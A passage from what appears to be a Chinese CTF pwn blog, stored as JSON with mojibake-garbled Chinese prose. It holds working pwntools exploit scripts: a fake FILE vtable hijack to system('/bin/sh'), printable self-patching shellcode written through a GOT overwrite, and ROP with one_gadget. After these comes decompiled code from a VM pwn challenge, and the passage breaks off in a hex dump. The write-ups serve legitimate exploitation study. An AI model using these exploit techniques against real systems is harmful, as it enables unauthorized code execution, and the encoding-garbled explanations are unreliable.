_IO_stdout && fp != _IO_stderr)\n    {\n      fp->_IO_file_flags = 0;\n      free(fp);\n    }\n\n  return status;\n}\n```\n\n\\_IO_IS_FILEBUFä¸º0x2000ï¼Œ\\_flags&0x2000ä¸º0å°±ä¼šç›´æ¥è°ƒç”¨\\_IO_FINSH(fp)ï¼Œ\\_IO_FINSH(fp)ç›¸å½“äºè°ƒç”¨fp->vtable->_finish(fp)\n\nå°†fpæŒ‡å‘ä¸€å—å†…å­˜pï¼Œpåç§»0çš„å‰4ä¸ªå­—èŠ‚è®¾ç½®ä¸º0xffffdfffï¼Œpåç§»4çš„ä½ç½®æ”¾ä¸Šå‚æ•°';/bin/sh'ï¼›påç§»sizeof(\\_IO_FILE)å¤§å°ä½ç½®(vtable)è¦†ç›–ä¸ºå†…å­˜qï¼Œ32ä½ç¨‹åºvtableåç§»ä¸º0x98ï¼Œqçš„2*4å­—èŠ‚å¤„(vtable->_finish)è¦†ç›–ä¸ºsystemå³å¯ã€‚\n\n### exp\n\n```python\n#==================================================\nio = start()\ndef openf(file):\n    sla(\":\",\"1\")\n    sla(\":\",file)\n\ndef readf():\n    sla(\":\",\"2\")\n\ndef writef():\n    sla(\":\",\"3\")\n\ndef closef():\n    sla(\":\",\"4\")\n\ndef quit(name):\n    sla(\":\",\"5\")\n    sla(\":\",name)\n\nopenf(\"/proc/self/maps\")\nreadf()\nwritef()\nreadf()\nwritef()\nru(b\"[heap]\\n\")\nlibc_base = int(re(8),16)+0x1000\ninfo(hex(libc_base))\nsystem = libc_base + libc.sym['system']\ninfo(hex(system))\n\nfakefile_addr = 0x0804B284\npayload = b\"a\"*0x20 + p32(fakefile_addr)\npayload += p32(0xffffdfff) + b\";/bin/sh\" #;$0\n# payload += b\"\\x00\"*0x88\npayload = payload.ljust(0x94+0x24,b\"\\x00\")\npayload += p32(fakefile_addr + 0x98)\npayload += p32(0)*2 + p32(system)\n\nquit(payload)\n\nia()\n```\n\n## 0x0C Death Note\n\næ¼æ´ç‚¹åœ¨addæ—¶ï¼Œåˆ©ç”¨äº†intç±»å‹çš„idxï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹åˆ°gotè¡¨ï¼Œåˆ©ç”¨addä¿®æ”¹åˆ°putsçš„gotï¼Œå†™å…¥shellcodeå³å¯\n\n![image-20221126215338101](https://files.catbox.moe/omdov6.png)\n\néš¾ç‚¹åœ¨äºprintableå‡½æ•°ï¼Œé™åˆ¶äº†shellcodeåªèƒ½ä¸ºå¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥int 0x80ä»¥åŠéå¯æ‰“å°å­—ç¬¦å‡ä¸å¯ä½¿ç”¨ã€‚\n\nç”¨åˆ°çš„æ–¹æ³•æ˜¯åœ¨shellcodeçš„æœ€åå†™å…¥`'\\x6b\\x40'`ï¼Œç„¶ååœ¨shellcodeä¸­ä½¿ç”¨`sub byte ptr[eax + 43], dl`ç­‰ï¼Œå°†`'\\x6b\\x40'`ï¼Œä¿®æ”¹ä¸º`\\xcd\\x80`ï¼Œå³int 0x80ï¼Œeax = 0x0båˆ™ä½¿ç”¨xoræ¥å®ç°\n\n### exp\n\n```python\nio = start()\ndef add(idx,name):\n    sla(\"choice :\",\"1\")\n    sla(\"Index :\",str(idx))\n    sla(\"Name :\",name)\n\ndef show(idx):\n    sla(\"choice :\",\"2\")\n    sla(\"Index :\",str(idx))\n\ndef delete(idx):\n    sla(\"choice :\",\"3\")\n    sla(\"Index :\",str(idx))\n# eax = 0xb ebx = /bin/sh ecx = 0 edx = 0 int 0x80 = /xcd/x80\nshellcode = '''\npush 0x68\npush 0x732f2f2f\npush 0x6e69622f\npush esp\npop ebx\n\npush edx\npop eax\npush 0x60\npop edx\nsub byte ptr[eax + 43], dl\nsub byte ptr[eax + 43], dl\nsub byte ptr[eax + 42], dl\npush 0x3e\npop edx\nsub byte ptr[eax + 42], dl\n\npush ecx\npop edx \npush edx\npop eax\nxor al, 0x60\nxor al, 0x6b\n    '''\nprint(asm(shellcode))\nshellcode = asm(shellcode) + b'\\x6b\\x40'\n# gdb.attach(io)\nadd(-16,shellcode)\n# delete(0)\nia()\n\n```\n\n![image-20221126220246095](https://files.catbox.moe/gqpdze.png)\n\nä¸å¤ªç†è§£æ ˆä¸Š`/bin/sh`å­—ç¬¦ä¸²çš„æˆªæ–­é—®é¢˜ï¼Œè¿™é‡Œç”¨çš„shellcraft.sh()ä¸­çš„/bin///sh\n\n## 0x0D starbound\n\n![image-20230301140357375](https://files.catbox.moe/u4xv4y.png)\n\nä¸€ä¸ªå¯ä»¥ç©çš„æ¸¸æˆï¼Œä»£ç é‡å¾ˆå¤§ï¼Œæ¼æ´åœ¨ä¸»å‡½æ•°è¾“å‡ºé€‰é¡¹æ—¶ï¼Œè°ƒç”¨å‡½æ•°æŒ‡é’ˆï¼Œè€Œç´¢å¼•v3æ˜¯intå‹ï¼Œé€ æˆè¶Šç•Œè®¿é—®ã€‚\n\nåœ¨è®¾ç½®ä¸­usernameå¯ä»¥è‡ªå·±è®¾ç½®ï¼Œå³å¯ä»¥ä¿®æ”¹bssæ®µåœ°å€ï¼Œè®¡ç®—åç§»ï¼Œå¯ä»¥å¾—åˆ°ä½äº-33çš„ä½ç½®ä¸Šã€‚\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v3; // eax\n  char nptr[256]; // [esp+10h] [ebp-104h] BYREF\n\n  init();\n  while ( 1 )\n  {\n    alarm(0x3Cu);\n    main_menu();\n    if ( !readn(nptr, 0x100u) )\n      break;\n    v3 = strtol(nptr, 0, 10);\n    if ( !v3 )\n      break;\n    ((void (*)(void))nop[v3])();// vlun\n  }\n  do_bye();\n  return 0;\n}\n```\n\nä¿®æ”¹nameä¸ºå‡½æ•°æŒ‡é’ˆå³å¯ã€‚\n\n### exp\n\n`0x0008048e48ï¼šadd esp 0x1c `ï¼Œè¦å…ˆè°ƒæ•´æ ˆå¸§ï¼Œä»¥èƒ½å¤Ÿæ‰§è¡Œåˆ°puts_pltï¼Œæœ€åæ‰§è¡Œsystem(' -33;/bin/sh')ï¼Œä½†æ˜¯ä¸ç†è§£ä¸ºä»€ä¹ˆè¦åœ¨å‰é¢åŠ ä¸ªç©ºæ ¼æ‰èƒ½æˆåŠŸã€‚\n\n```python\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr = 0x0804A605\nsla('>','6')\nsla('>','2')\nsla(' name:',p32(0x0008048e48))\nsla('>',b'-33\\x00'+b'aaaa'+p32(puts_plt)+p32(main_addr)+p32(puts_got))\nlibc_base = l32() - 0x67d90\ninf(libc_base)\nogg = one_gadget(libc_base)\n# inf(ogg[0])\nsystem = libc_base + libc.sym['system']\nbinsh = next(libc.search(b'/bin/sh\\x00')) + libc_base\ninf(system)\ninf(binsh)\nsla('>','6')\nsla('>','2')\n# sla(' name:',p32(system))\n# sa('>',' -33;/bin/sh\\x00')\nsla(' name:',p32(ogg[1]))\ngdb.attach(io)\nsla('>','-33')\nia()\n```\n\n","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Sep_Match 2020","url":"/2020/09/28/Sep_Match/","content":"\n# 0x00 å‰è¨€\n\nCUMTCTF2020 å‡ºäº†ä¸€æ¬¡é¢˜ï¼Œç¬¬ä¸€æ¬¡ç«™åœ¨å‡ºé¢˜äººè§’åº¦çœ‹ctfæ¯”èµ›ï¼Œ\n\næ”¶è·é¢‡å¤šï¼Œä½“ä¼šåˆ°äº†å‡ºé¢˜äººçš„è¾›è‹¦ï¼Œä¸è¿‡è¿˜å¥½æ²¡å‡ºä»€ä¹ˆå¤§é—®é¢˜\n\n# 0x01 gactf vmpwn\n\nç¬¬ä¸€æ¬¡åšvmpwnï¼Œæ¨¡æ‹Ÿæ ˆçš„ç¨‹åºï¼Œåˆ†æè¿˜æŒºéº»çƒ¦ï¼Œçœ‹äº†å¾ˆä¹…å¾ˆä¹…ç”šè‡³ä¸æƒ³å†™è¿™ç¯‡åšå®¢...è™šæ‹Ÿæ ˆå˜›è‚¯å®šè¦ç”¨åˆ°é€†å‘çš„çŸ¥è¯†\n\næ€»çš„æ€æƒ³mallocä¸‰å—å†…å­˜ï¼Œåˆ†åˆ«å­˜æ”¾å¯„å­˜å™¨ã€æ•°æ®ã€æŒ‡ä»¤\n\næºç¨‹åºåšäº†ä¸€ç‚¹æ³¨é‡Šï¼Œæ²¡å†™å®Œï¼Œå¥½ç´¯ï¼Œä¸‹é¢æŠŠæ‰€æœ‰æŒ‡ä»¤æ•´ç†æˆäº†æŒ‡ä»¤é›†\n\n```c\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  unsigned __int8 *v3; // rax\n  _QWORD *v4; // rax\n  _QWORD *v5; // rax\n  _QWORD *v6; // rax\n  int v7; // ST0C_4\n  int v8; // ST0C_4\n  int v9; // ST0C_4\n  int v10; // ST0C_4\n  int v11; // ST0C_4\n  int v12; // ST0C_4\n  int v13; // ST0C_4\n  int v14; // ST0C_4\n  int v15; // ST0C_4\n  int v16; // ST0C_4\n  int v17; // ST0C_4\n  int v18; // ST0C_4\n  int v19; // ST0C_4\n  int v20; // ST0C_4\n  int v21; // ST0C_4\n  int v22; // ST0C_4\n  int v23; // ST0C_4\n  _QWORD *v24; // rax\n  __int64 result; // rax\n  signed int v26; // [rsp+Ch] [rbp-24h]\n  signed int v27; // [rsp+Ch] [rbp-24h]\n  signed int v28; // [rsp+Ch] [rbp-24h]\n  signed int v29; // [rsp+Ch] [rbp-24h]\n  signed int v30; // [rsp+Ch] [rbp-24h]\n  signed int v31; // [rsp+Ch] [rbp-24h]\n  signed int v32; // [rsp+Ch] [rbp-24h]\n  _QWORD *v33; // [rsp+10h] [rbp-20h]\n  char *v34; // [rsp+18h] [rbp-18h]\n  char *v35; // [rsp+20h] [rbp-10h]\n\n  sub_BA0();\n  v33 = calloc(0x30uLL, 1uLL);\n  v34 = (char *)calloc(0x1000uLL, 1uLL);        // .data\n  v35 = (char *)calloc(0x2000uLL, 1uLL);\n  v33[3] = v35 + 0x1E00;                        // rsp\n  v33[5] = &unk_203020;                         // op code\n  if ( !v34 || !v35 )\n    sub_AC0((__int64)\"out of memory\");\n  while ( 1 )\n  {\n    v3 = (unsigned __int8 *)v33[5];\n    v33[5] = v3 + 1;                            // pc\n    switch ( (unsigned int)off_1880 )\n    {\n      case 0x10u:\n        *v33 = v33[3];                          // mov rax,rsp\n        break;\n      case 0x11u:\n        *v33 = *(_QWORD *)v33[5];               // mov rax,i\n        v33[5] += 8LL;\n        break;\n      case 0x12u:\n        v33[1] = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        break;\n      case 0x13u:\n        v33[2] = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        break;\n      case 0x20u:\n        v26 = *(_QWORD *)v33[5];\n        if ( v26 < 0 || v26 > 0xFFF )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *v33 = &v34[v26];                       // mov rax,&data[x]\n        v33[5] += 8LL;\n        break;\n      case 0x21u:\n        v27 = *(_QWORD *)v33[5];\n        if ( v27 < 0 || v27 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *v33 = *(_QWORD *)&v34[v27];            // mov rax,data[x]\n        v33[5] += 8LL;\n        break;\n      case 0x22u:\n        v28 = *(_QWORD *)v33[5];\n        if ( v28 < 0 || v28 > 0xFFF )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        v33[1] = *(_QWORD *)&v34[v28];\n        v33[5] += 8LL;\n        break;\n      case 0x23u:\n        v29 = *(_QWORD *)v33[5];\n        if ( v29 < 0 || v29 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        v33[2] = *(_QWORD *)&v34[v29];\n        v33[5] += 8LL;\n        break;\n      case 0x33u:\n        v30 = *(_QWORD *)v33[5];\n        if ( v30 < 0 || v30 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *(_QWORD *)&v34[v30] = *v33;\n        v33[5] += 8LL;\n        break;\n      case 0x34u:\n        v31 = *(_QWORD *)v33[5];\n        if ( v31 < 0 || v31 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *(_QWORD *)&v34[v31] = v33[1];\n        v33[5] += 8LL;\n        break;\n      case 0x35u:\n        v32 = *(_QWORD *)v33[5];\n        if ( v32 < 0 || v32 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *(_QWORD *)&v34[v32] = v33[2];\n        v33[5] += 8LL;\n        break;\n      case 0x44u:\n        if ( v33[3] - (_QWORD)v35 <= 8LL )\n          sub_AC0((__int64)\"stack underflow detected\");\n        v33[3] -= 8LL;\n        *(_QWORD *)v33[3] = *v33;               // push rax\n        break;\n      case 0x45u:\n        if ( v33[3] - (_QWORD)v35 <= 8LL )\n          sub_AC0((__int64)\"stack underflow detected\");\n        v33[3] -= 8LL;\n        *(_QWORD *)v33[3] = v33[1];\n        break;\n      case 0x46u:\n        if ( v33[3] - (_QWORD)v35 <= 8LL )\n          sub_AC0((__int64)\"stack underflow detected\");\n        v33[3] -= 8LL;\n        *(_QWORD *)v33[3] = v33[2];\n        break;\n      case 0x51u:\n        if ( v33[3] - (_QWORD)v35 > 0x1DFFLL )\n          sub_AC0((__int64)\"stack overflow detected\");\n        v4 = (_QWORD *)v33[3];\n        v33[3] = v4 + 1;\n        *v33 = *v4;\n        break;\n      case 0x52u:\n        if ( v33[3] - (_QWORD)v35 > 7679LL )\n          sub_AC0((__int64)\"stack overflow detected\");\n        v5 = (_QWORD *)v33[3];\n        v33[3] = v5 + 1;\n        v33[1] = *v5;\n        break;\n      case 0x53u:\n        if ( v33[3] - (_QWORD)v35 > 7679LL )\n          sub_AC0((__int64)\"stack overflow detected\");\n        v6 = (_QWORD *)v33[3];\n        v33[3] = v6 + 1;\n        v33[2] = *v6;\n        break;\n      case 0x61u:\n        v7 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        *v33 += v7;\n        break;\n      case 0x62u:\n        v8 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[1] += v8;\n        break;\n      case 0x63u:\n        v9 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[2] += v9;\n        break;\n      case 0x64u:\n        v12 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        *v33 -= v12;\n        break;\n      case 0x65u:\n        v13 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[1] -= v13;\n        break;\n      case 0x66u:\n        v14 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[2] -= v14;\n        break;\n      case 0x67u:\n        v15 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        *v33 *= v15;\n        break;\n      case 0x68u:\n        v16 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[1] *= v16;\n        break;\n      case 0x69u:\n        v17 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[2] *= v17;\n        break;\n      case 0x6Au:\n        v18 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        *v33 ^= v18;\n        break;\n      case 0x6Bu:\n        v19 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[1] ^= v19;\n        break;\n      case 0x6Cu:\n        v20 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[2] ^= v20;\n        break;\n      case 0x6Du:\n        *v33 = 0LL;\n        break;\n      case 0x6Eu:\n        v33[1] = 0LL;\n        break;\n      case 0x6Fu:\n        v33[2] = 0LL;\n        break;\n      case 0x7Eu:\n        v22 = *(signed __int16 *)v33[5];\n        v33[5] += 2LL;\n        v33[5] += v22;\n        break;\n      case 0x7Fu:\n        v33[5] = *v33;\n        break;\n      case 0x80u:\n        v33[3] += 8LL;\n        *(_QWORD *)v33[3] = v33[5];\n        v33[5] = *v33;\n        break;\n      case 0x81u:\n        v10 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[3] += 8LL * (v10 / 8);\n        break;\n      case 0x82u:\n        v11 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[3] += -8LL * (v11 / 8);\n        break;\n      case 0x88u:\n        v23 = *(signed __int16 *)v33[5];\n        v33[5] += 2LL;\n        v33[3] += 8LL;\n        *(_QWORD *)v33[3] = v33[5];\n        v33[5] += v23;\n        break;\n      case 0x8Fu:\n        v21 = *(unsigned __int8 *)v33[5]++;\n        ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))*(&off_2038E0 + v21))(*v33, v33[1], v33[2]);\n        break;\n      case 0x90u:\n        v24 = (_QWORD *)v33[3];\n        v33[3] = v24 - 1;\n        v33[5] = *v24;\n        break;\n      case 0xFFu:\n        return 0LL;\n      default:\n        printf(\":%d\\n\", *v3);\n        sub_AC0((__int64)\"Illegal Instrumention\");\n        return result;\n    }\n  }\n}\n```\n\nç†è§£ç¨‹åºå†™å‡ºæŒ‡ä»¤é›†\n\n```c\n//æ¨¡æ‹Ÿç³»ç»Ÿè°ƒç”¨è¡¨\n//mov rax,rsp\n#define MOV_RAX_RSP 0x10\n//mov rax,immediate_value\n#define MOV_RAX_I 0x11\n//mov rbx,immediate_value\n#define MOV_RBX_I 0x12\n//mov rcx,immediate_value\n#define MOV_RCX_I 0x13\n//mov rax,&data_mem[x]\n#define MOV_RAX_MEM_ADDR 0x20\n//mov rax,data_mem[x]\n#define MOV_RAX_MEM 0x21\n//mov rbx,data_mem[x]\n#define MOV_RBX_MEM 0x22\n//mov rcx,data_mem[x]\n#define MOV_RCX_MEM 0x23\n//mov data_mem[x],rax\n#define MOV_MEM_RAX 0x33\n//mov data_mem[x],rbx\n#define MOV_MEM_RBX 0x34\n//mov data_mem[x],rcx\n#define MOV_MEM_RCX 0x35\n//push rax\n#define PUSH_RAX 0x44\n//push rbx\n#define PUSH_RBX 0x45\n//push rcx\n#define PUSH_RCX 0x46\n//pop rax\n#define POP_RAX 0x51\n//pop rbx\n#define POP_RBX 0x52\n//pop rcx\n#define POP_RCX 0x53\n//add rax,immdiate_value\n#define ADD_RAX_I 0x61\n//add rbx,immdiate_value\n#define ADD_RBX_I 0x62\n//add rcx,immdiate_value\n#define ADD_RCX_I 0x63\n//sub rax,immdiate_value\n#define SUB_RAX_I 0x64\n//sub rbx,immdiate_value\n#define SUB_RBX_I 0x65\n//sub rcx,immdiate_value\n#define SUB_RCX_I 0x66\n//mul rax,immdiate_value\n#define MUL_RAX_I 0x67\n//mul rbx,immdiate_value\n#define MUL_RBX_I 0x68\n//mul rcx,immdiate_value\n#define MUL_RCX_I 0x69\n//xor rax,immdiate_value\n#define XOR_RAX_I 0x6A\n//xor rbx,immdiate_value\n#define XOR_RBX_I 0x6B\n//xor rcx,immdiate_value\n#define XOR_RCX_I 0x6C\n//xor rax,rax\n#define ZERO_RAX 0x6D\n//xor rbx,rbx\n#define ZERO_RBX 0x6E\n//xor rcx,rcx\n#define ZERO_RCX 0x6F\n//syscall\n#define SYSCALL 0x8F\n//jmp $+-\n#define JMP_NEAR 0x7E\n//jmp rax\n#define JMP_RAX 0x7F\n//call rax\n#define CALL_RAX 0x80\n//call near\n#define CALL_NEAR 0x88\n//leave\n#define LEAVE 0x90\n//exit\n#define EXIT 0xFF\n//add rsp,immdiate_value\n#define ADD_RSP_I 0x81\n//sub rsp,immdiate_value\n#define SUB_RSP_I 0x82\n```\n\ndumpå‡ºä»£ç æ®µæ•°æ®ï¼š\n\n```c\n//ä»£ç æ®µæ•°æ®\nunsigned char ida_chars[] =\n{\n  0x7E, 0xA5, 0x03, 0x82, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, \n  0x23, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x33, \n  0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x23, \n  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x33, 0x10, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x23, 0x23, 0x23, \n  0x23, 0x23, 0x23, 0x23, 0x23, 0x33, 0x18, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x23, 0x23, 0x23, 0x23, 0x23, \n  0x23, 0x23, 0x23, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x33, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, \n  0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x13, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, \n  0x01, 0x11, 0x23, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, \n  0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x20, 0x20, 0x77, 0x65, 0x6C, 0x63, 0x6F, 0x6D, 0x33, 0x08, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x65, 0x20, \n  0x74, 0x6F, 0x20, 0x32, 0x30, 0x32, 0x33, 0x10, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x30, 0x20, 0x47, 0x41, \n  0x43, 0x54, 0x46, 0x20, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x23, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x33, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, \n  0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, \n  0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, \n  0x11, 0x23, 0x20, 0x20, 0x20, 0x74, 0x68, 0x69, 0x73, 0x33, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, \n  0x69, 0x73, 0x20, 0x61, 0x20, 0x6D, 0x65, 0x33, 0x08, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x73, 0x73, 0x61, \n  0x67, 0x65, 0x20, 0x66, 0x72, 0x33, 0x10, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x6F, 0x6D, 0x20, 0x76, 0x6D, \n  0x20, 0x6D, 0x61, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x63, 0x68, 0x69, 0x6E, 0x65, 0x20, 0x20, \n  0x23, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, \n  0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, \n  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x29, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, \n  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x33, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x23, 0x23, \n  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x33, 0x08, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x23, 0x23, 0x23, 0x23, \n  0x23, 0x23, 0x23, 0x23, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, \n  0x23, 0x23, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, \n  0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, 0x28, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, 0x01, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x29, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, 0x23, \n  0x74, 0x65, 0x6C, 0x6C, 0x20, 0x6D, 0x65, 0x33, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x77, 0x68, \n  0x61, 0x74, 0x20, 0x69, 0x73, 0x33, 0x08, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x79, 0x6F, 0x75, 0x72, \n  0x20, 0x6E, 0x61, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x6D, 0x65, 0x3A, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, \n  0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x13, 0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, \n  0x01, 0x10, 0x44, 0x52, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x13, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x8F, 0x00, 0x10, 0x8F, 0x02, 0x11, 0x6F, 0x6B, \n  0x2C, 0x77, 0x68, 0x61, 0x74, 0x20, 0x33, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x64, 0x6F, 0x20, 0x79, \n  0x6F, 0x75, 0x20, 0x77, 0x33, 0x08, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x61, 0x6E, 0x74, 0x20, 0x74, 0x6F, \n  0x20, 0x73, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x61, 0x79, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, \n  0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, \n  0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, \n  0x10, 0x44, 0x52, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x13, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x8F, 0x00, 0x11, 0x4E, 0x6F, 0x77, 0x2C, 0x49, 0x20, \n  0x72, 0x65, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x63, 0x65, 0x76, 0x69, 0x65, 0x20, 0x79, 0x6F, \n  0x33, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x75, 0x72, 0x20, 0x6D, 0x65, 0x73, 0x73, 0x61, 0x33, 0x10, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x67, 0x65, \n  0x2C, 0x62, 0x79, 0x65, 0x7E, 0x0A, 0x33, 0x18, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, 0x01, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x20, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x81, 0x00, 0x01, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x11, 0x20, 0x5F, 0x5F, \n  0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x33, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, \n  0x5F, 0x5F, 0x5F, 0x33, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x5F, 0x5F, 